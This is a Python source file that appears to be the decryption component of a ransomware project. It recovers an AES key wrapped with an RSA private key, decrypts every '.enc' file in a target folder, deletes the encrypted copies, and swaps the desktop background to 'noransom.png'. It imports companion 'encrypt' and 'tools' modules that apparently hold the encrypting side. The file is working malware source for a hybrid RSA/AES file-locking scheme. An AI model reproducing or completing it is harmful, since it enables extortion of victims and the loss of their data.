from Crypto.Cipher import AES, PKCS1_OAEP
from encrypt import all_files, delete_file
from tools import change_background, get_venv_var, read_bytes, write_bytes 
from tools import AES_KF, AES_KF_E, PRIV_KF, ABS_ROUTE_TARGET_FOLDER
from mykeys import bytes_to_RSA_key
from os.path import isfile

def decrypt_file(file_name: str, aes_key: bytes) -> None:
    assert file_name[-4:] == '.enc'

    file_in = open(file_name, 'rb')
    nonce, tag, ciphertext = [ file_in.read(x) for x in (16, 16, -1) ]
    file_in.close()

    cipher = AES.new(aes_key, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)
    write_bytes(data, file_name[:-4])


def decrypt_file_RSA(file_name: str, priv_key) -> None:
    assert file_name[-4:] == '.enc'

    encrypted_data = read_bytes(file_name)
    cipher = PKCS1_OAEP.new(priv_key)

    decrypted_data = cipher.decrypt(encrypted_data)
    write_bytes(decrypted_data, file_name[:-4])


if __name__ == '__main__':

    TARGET = get_venv_var('TARGET')
    if TARGET == None:
        TARGET = ABS_ROUTE_TARGET_FOLDER

    print('target:', TARGET)

    target_files = all_files(TARGET)

    assert isfile(PRIV_KF), 'No private RSA key, can\'t decrypt.'
    assert isfile(AES_KF), 'Missing AES key, can\'t decrypt.'

    priv_key = bytes_to_RSA_key(read_bytes(PRIV_KF))

    decrypt_file_RSA(AES_KF_E, priv_key)

    aes_key = read_bytes(AES_KF)

    for file in target_files:
        decrypt_file(file, aes_key)
        delete_file(file)

    delete_file(AES_KF_E)
    change_background('noransom.png')
